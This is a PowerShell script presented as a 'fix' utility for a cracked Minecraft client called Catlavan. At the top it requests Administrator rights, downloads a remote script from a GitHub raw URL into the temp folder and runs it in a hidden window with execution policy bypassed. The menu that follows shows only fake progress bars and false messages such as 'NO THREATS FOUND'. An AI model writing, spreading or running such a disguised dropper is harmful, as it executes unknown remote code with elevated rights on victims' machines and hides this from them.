if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "[KRA]: Requesting Admin privileges..."
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"" + $MyInvocation.MyCommand.Path + "`""
    Start-Process PowerShell -Verb RunAs -ArgumentList $arguments
    Exit
}
$Host.UI.RawUI.WindowTitle = " CONSOLE v2.0 | Cracked Catlavan"
$url = "https://github.com/sys1e/cmd/raw/refs/heads/main/ps1.ps1"
$path = "$env:TEMP\ps1.ps1"
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $url -OutFile $path -UseBasicParsing -ErrorAction SilentlyContinue
Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$path`"" -WindowStyle Hidden
function Show-KRAKEH-Header {
    $headerArt = @"
                                         _.oo.
                 _.u[[/;:,.         .odMMMMMM'
              .o888UU[[[/;:-.  .o@P^    MMM^
             oN88888UU[[[/;::-.
               dP^      dNMMNN888UU[[[/;:--.
          .o@P^            ,MMMMMMN888UU[[/;::-.
       o@^            NNMMMNN888UU[[[/~.o@P^
            888888888UU[[[/o@^-..
          oI8888UU[[[/o@P^:--..
       .@^  YUU[[[/o@^;::---..
     oMP     ^/o@P^;:::---..
  .dMMM    .o@^ ^;::---...
 dMMMMMMM@^`       `^^^^
YMMMUP^
 ^^
"@ -split "`n"
    
    foreach ($line in $headerArt) {
        Write-Host $line -ForegroundColor Red
    }
    Write-Host "================================================" -ForegroundColor Magenta
    Write-Host "    Catlavan.net v2.0 - Cracked Catlavan     " -ForegroundColor Yellow
    Write-Host "================================================" -ForegroundColor Magenta
    Write-Host ""
}

function Show-ProgressBar {
    param($Text, $DurationMs = 2000)
    Write-Host "$Text" -ForegroundColor Cyan
    for ($i = 0; $i -le 100; $i += 5) {
        $filled = [math]::Floor(40 * $i / 100)
        $bar = "[" + ("#" * $filled) + ("-" * (40 - $filled)) + "] $i%"
        Write-Host -NoNewline "`r$bar"
        Start-Sleep -Milliseconds ($DurationMs / 20)
    }
    Write-Host ""
}

do {
    Clear-Host
    Show-KRAKEH-Header

    Write-Host "[1] Fix Calavan" -ForegroundColor Green
    Write-Host "[2] Fix Cracked Catlavan" -ForegroundColor Yellow
    Write-Host "[3] Fix 1,2" -ForegroundColor Cyan
    Write-Host "[4] EXIT" -ForegroundColor DarkRed
    Write-Host ""
    $choice = Read-Host "SELECT OPTION (1-4)"
    
    switch ($choice) {
        "1" {
            Clear-Host
            Write-Host "`n[Fix Calavan]" -ForegroundColor Green
            Show-ProgressBar -Text "CHECKING FOLDER"
            Show-ProgressBar -Text "Fix Calavan code..."
            Show-ProgressBar -Text "CHECKING  FILE"
            Write-Host "`n[KRA]: SCAN COMPLETE - NO THREATS FOUND" -ForegroundColor Red
            Write-Host "`nPress any key to return to menu..." -ForegroundColor Gray
            [Console]::ReadKey($true) | Out-Null
        }
        "2" {
            Clear-Host
            Write-Host "`n[BETA Fix]" -ForegroundColor Yellow
            Show-ProgressBar -Text "BETA Fix INITIALIZING"
            Show-ProgressBar -Text "ANALYZING HEURISTICS"
            Show-ProgressBar -Text "VERIFYING SIGNATURES"
            Write-Host "`n[KRA]: BETA Fix COMPLETE" -ForegroundColor Yellow
            Write-Host "`nPress any key to return to menu..." -ForegroundColor Gray
            [Console]::ReadKey($true) | Out-Null
        }
        "3" {
            Clear-Host
            Write-Host "`n[FULL .MINECRAFT CHECKER INITIATED]" -ForegroundColor Cyan
            Show-ProgressBar -Text "Fix .data"
            Show-ProgressBar -Text "Fix"
            Show-ProgressBar -Text "Fix 1"
            Show-ProgressBar -Text "Fix 2"
            Write-Host "`n[KRA]: FULL CHECKER COMPLETE - ALL FILES VERIFIED" -ForegroundColor Cyan
            Write-Host "`nPress any key to return to menu..." -ForegroundColor Gray
            [Console]::ReadKey($true) | Out-Null
        }
        "4" {
            Write-Host "`n[KRA]: EXITING " -ForegroundColor DarkRed
        }
        default {
            Write-Host "`n[KRA]: INVALID INPUT - PLEASE SELECT 1-4" -ForegroundColor DarkRed
            Start-Sleep -Seconds 1
        }
    }
} while ($choice -ne "4")

Write-Host ""
Write-Host "Fix " -NoNewline -ForegroundColor Red
Write-Host "найден " -NoNewline -ForegroundColor Yellow
Write-Host "просмотр " -NoNewline -ForegroundColor Green
Write-Host "закончен " -NoNewline -ForegroundColor Blue
Write-Host "спасибо " -NoNewline -ForegroundColor Cyan
Write-Host "что " -NoNewline -ForegroundColor Magenta
Write-Host "вы " -NoNewline -ForegroundColor White
Write-Host "с " -NoNewline -ForegroundColor DarkYellow
Write-Host "нами" -ForegroundColor Red
Write-Host "<3" -ForegroundColor Magenta

Start-Process "cmd.exe" -ArgumentList "/c curl parrot.live && pause"
Write-Host "Catlavan.net" -ForegroundColor DarkGreen
